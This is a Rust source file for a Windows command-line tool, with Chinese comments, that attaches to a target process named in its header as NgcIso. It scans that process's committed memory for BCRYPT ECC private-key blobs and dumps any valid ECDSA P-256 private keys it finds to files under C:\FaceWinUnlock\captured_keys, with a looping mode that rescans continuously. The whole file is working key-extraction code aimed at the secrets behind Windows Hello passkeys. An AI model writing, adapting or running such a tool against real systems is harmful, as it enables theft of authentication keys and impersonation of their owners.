//! NgcIso 进程内存扫描器 — 不注入，读内存搜 ECDSA 私钥
//!
//! 用法: mem_scanner.exe <PID>
//!
//! 工作原理:
//!   1. OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
//!   2. VirtualQueryEx 逐个枚举内存区域
//!   3. ReadProcessMemory 扫描 MEM_COMMIT + PAGE_READWRITE 区域
//!   4. 搜索 BCRYPT_ECCPRIVATE_BLOB magic 0x32434345
//!   5. 找到后提取 104 字节并推导公钥验证

use std::ffi::c_void;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Threading::{
    OpenProcess,
    PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_VM_OPERATION,
};
use windows::Win32::System::Memory::{
    VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_MAPPED, MEM_PRIVATE,
    PAGE_READWRITE, PAGE_READONLY, PAGE_WRITECOPY, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;

const MAGIC_ECC2: u32 = 0x32434345;
const BLOB_SIZE: usize = 104;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("用法: mem_scanner.exe <PID> [--loop]");
        eprintln!("  --loop  持续扫描，每2秒一轮，直到 Ctrl+C");
        std::process::exit(1);
    }
    let pid: u32 = args[1].parse().unwrap_or_else(|_| {
        eprintln!("无效 PID: {}", args[1]);
        std::process::exit(1);
    });
    let looping = args.len() > 2 && args[2] == "--loop";

    unsafe {
        if looping {
            scan_process_loop(pid);
        } else {
            scan_process(pid);
        }
    };
}

unsafe fn scan_process(pid: u32) {
    println!("打开 PID={} (PROCESS_VM_READ)...", pid);

    let access = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION;
    let hproc = match OpenProcess(access, false, pid) {
        Ok(h) => {
            println!("OpenProcess OK");
            h
        }
        Err(e) => {
            eprintln!("OpenProcess 失败: {e}");
            eprintln!("→ NgcIso 仍然是 PPL，无法读取内存。需要更进一步的环境硬化。");
            return;
        }
    };

    // 创建输出目录
    let _ = std::fs::create_dir_all(r"C:\FaceWinUnlock\captured_keys");

    let mut addr: usize = 0;
    let mut regions_scanned = 0;
    let mut bytes_scanned = 0u64;
    let mut found = 0u32;

    println!("扫描内存区域...");
    let start = std::time::Instant::now();

    loop {
        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let result = VirtualQueryEx(
            hproc,
            Some(addr as *const c_void),
            &mut mbi,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        );
        if result == 0 {
            break; // 所有区域查询完毕
        }

        // 只扫描已提交的可读区域
        let state_ok = mbi.State == MEM_COMMIT;
        let type_ok = mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED;
        let protect_ok = mbi.Protect == PAGE_READWRITE
            || mbi.Protect == PAGE_READONLY
            || mbi.Protect == PAGE_WRITECOPY
            || mbi.Protect == PAGE_EXECUTE_READWRITE;

        if state_ok && type_ok && protect_ok {
            let region_size = mbi.RegionSize;
            // 对大区域分块读取（每块 8 MB）
            let chunk_size = 8 * 1024 * 1024;
            let mut offset: usize = 0;

            while offset < region_size {
                let remaining = region_size - offset;
                let read_size = if remaining > chunk_size { chunk_size } else { remaining };
                let current_addr = addr + offset;

                let mut buf = vec![0u8; read_size];
                let mut bytes_read = 0usize;

                match ReadProcessMemory(hproc, current_addr as *const c_void, buf.as_mut_ptr() as _, read_size, Some(&mut bytes_read)) {
                    Ok(()) => {
                        // 搜索 ECC2 magic
                        let search_len = bytes_read.min(read_size);
                        if search_len >= BLOB_SIZE {
                            scan_buffer(&buf[..search_len], current_addr, &mut found);
                        }
                        bytes_scanned += bytes_read as u64;
                    }
                    Err(_e) => {
                        // 部分页不可读，跳过这个 chunk
                    }
                }
                offset += read_size;
                if offset >= region_size { break; }
            }
            regions_scanned += 1;
        }

        addr += mbi.RegionSize;
        // 防止无限循环
        if addr > 0x7FFFFFFFFFFF {
            break;
        }
    }

    let elapsed = start.elapsed();
    println!("\n--- 扫描完成 ---");
    println!("耗时: {:.1}s", elapsed.as_secs_f64());
    println!("区域: {} | 字节: {} MB", regions_scanned, bytes_scanned / 1024 / 1024);
    println!("找到: {} 个候选密钥", found);

    if found == 0 {
        println!("\n未找到 ECDSA 密钥。可能原因:");
        println!("  1. 扫描时未执行 passkey（密钥不在内存）");
        println!("  2. 密钥在只读页 / 内核空间（ReadProcessMemory 不可达）");
        println!("  3. 密钥格式非 BCRYPT_ECCPRIVATE_BLOB");
    }

    let _ = CloseHandle(hproc);
}

fn scan_buffer(data: &[u8], base_addr: usize, found: &mut u32) {
    let magic_bytes = MAGIC_ECC2.to_le_bytes();
    let mut i = 0;
    while i + BLOB_SIZE <= data.len() {
        if data[i] == magic_bytes[0]
            && data[i + 1] == magic_bytes[1]
            && data[i + 2] == magic_bytes[2]
            && data[i + 3] == magic_bytes[3]
        {
            let cb_key = u32::from_le_bytes([data[i+4], data[i+5], data[i+6], data[i+7]]);
            if cb_key == 32 {
                let blob = &data[i..i + BLOB_SIZE];
                let abs_addr = base_addr + i;
                let out_name = format!(
                    "C:\\FaceWinUnlock\\captured_keys\\memscan_{:016X}.bin",
                    abs_addr
                );
                let _ = std::fs::write(&out_name, blob);
                *found += 1;
                println!("\n📍 地址 0x{:016X} — cbKey=32", abs_addr);

                // 推导公钥验证
                match verify_blob(blob) {
                    Ok(_) => println!("  ✅ 有效 ECDSA_P256 私钥 → {}", out_name),
                    Err(e) => {
                        println!("  ❌ {}", e);
                        let _ = std::fs::remove_file(&out_name);
                    }
                }
            }
        }
        i += 4;
    }
}

fn verify_blob(blob: &[u8]) -> Result<(), String> {
    use p256::SecretKey;
    use p256::elliptic_curve::sec1::ToEncodedPoint;

    let x = &blob[8..40];
    let y = &blob[40..72];
    let d = &blob[72..104];

    let sk = SecretKey::from_bytes(d.into()).map_err(|e| format!("无效 P256 私钥: {e}"))?;
    let pk = sk.public_key();
    let point = pk.to_encoded_point(false);
    let dx = point.x().ok_or("缺少 X")?;
    let dy = point.y().ok_or("缺少 Y")?;

    if dx.as_slice() != x || dy.as_slice() != y {
        return Err("自洽校验失败".into());
    }

    // 输出 COSE Public Key
    println!("    X: {}...", hex::encode(&x[..8]));
    println!("    COSE: {}", cose_public_key(x, y));
    Ok(())
}

// ─── 循环扫描模式 ────────────────────────────────────────────────────────

unsafe fn scan_process_loop(pid: u32) {
    use std::collections::HashSet;

    let access = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION;
    let hproc = match OpenProcess(access, false, pid) {
        Ok(h) => { println!("OpenProcess OK, loop scanning启动...\n"); h }
        Err(e) => { eprintln!("OpenProcess 失败: {e}"); return; }
    };

    let _ = std::fs::create_dir_all(r"C:\FaceWinUnlock\captured_keys");
    let mut seen: HashSet<usize> = HashSet::new();
    let mut pass = 0u64;

    // 先枚举所有区域，只记录小而可写的
    let mut targets: Vec<(usize, usize)> = Vec::new();
    let mut addr: usize = 0;
    loop {
        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        if VirtualQueryEx(hproc, Some(addr as *const c_void), &mut mbi,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>()) == 0 { break; }

        let state_ok = mbi.State == MEM_COMMIT;
        let type_ok = mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED;
        let protect_ok = mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY
            || mbi.Protect == PAGE_WRITECOPY || mbi.Protect == PAGE_EXECUTE_READWRITE;

        if state_ok && type_ok && protect_ok && mbi.RegionSize <= 128 * 1024 * 1024 {
            targets.push((addr, mbi.RegionSize));
        }
        addr += mbi.RegionSize;
        if addr > 0x7FFFFFFFFFFF { break; }
    }

    println!("区域: {} | 扫描中，每轮...", targets.len());

    loop {
        pass += 1;
        let mut found_this_pass = 0u32;
        let mut bytes = 0u64;
        let t0 = std::time::Instant::now();

        for &(base, size) in &targets {
            let chunk = 4 * 1024 * 1024; // 4MB chunks
            let mut off: usize = 0;
            while off < size {
                let remain = size - off;
                let n = if remain > chunk { chunk } else { remain };
                let cur = base + off;
                let mut buf = vec![0u8; n];
                let mut rd = 0usize;
                if ReadProcessMemory(hproc, cur as *const c_void, buf.as_mut_ptr() as _, n, Some(&mut rd)).is_ok() {
                    let limit = rd.min(n);
                    bytes += limit as u64;
                    if limit >= BLOB_SIZE {
                        let magic = MAGIC_ECC2.to_le_bytes();
                        let mut i = 0;
                        while i + BLOB_SIZE <= limit {
                            if buf[i] == magic[0] && buf[i+1] == magic[1]
                                && buf[i+2] == magic[2] && buf[i+3] == magic[3]
                            {
                                let abs_addr = cur + i;
                                let cb_key = u32::from_le_bytes([buf[i+4], buf[i+5], buf[i+6], buf[i+7]]);
                                if cb_key == 32 && !seen.contains(&abs_addr) {
                                    seen.insert(abs_addr);
                                    let blob = &buf[i..i + BLOB_SIZE];
                                    let out = format!("C:\\FaceWinUnlock\\captured_keys\\memscan_{:016X}.bin", abs_addr);
                                    let _ = std::fs::write(&out, blob);
                                    match verify_blob(blob) {
                                        Ok(_) => {
                                            found_this_pass += 1;
                                            println!("[PASS {}] ✅ 地址 0x{:016X} — 有效 ECDSA_P256 → {}",
                                                pass, abs_addr, out);
                                        }
                                        Err(e) => {
                                            println!("[PASS {}] ❌ 0x{:016X}: {}", pass, abs_addr, e);
                                            let _ = std::fs::remove_file(&out);
                                        }
                                    }
                                }
                            }
                            i += 4;
                        }
                    }
                }
                off += n;
            }
        }

        let elapsed = t0.elapsed().as_secs_f64();
        let mb = bytes / 1024 / 1024;
        eprint!("\r[PASS {pass}] {mb}MB in {elapsed:.1}s | found={found_this_pass}    ");

        if found_this_pass == 0 {
            // 避免过热
            std::thread::sleep(std::time::Duration::from_millis(500));
        }
    }
}

fn cose_public_key(x: &[u8], y: &[u8]) -> String {
    let mut cbor = Vec::with_capacity(80);
    cbor.push(0xA5); cbor.push(0x01); cbor.push(0x02);
    cbor.push(0x03); cbor.push(0x26);
    cbor.push(0x20); cbor.push(0x01);
    cbor.push(0x21); cbor.push(0x58); cbor.push(0x20); cbor.extend_from_slice(x);
    cbor.push(0x22); cbor.push(0x58); cbor.push(0x20); cbor.extend_from_slice(y);
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&cbor)
}
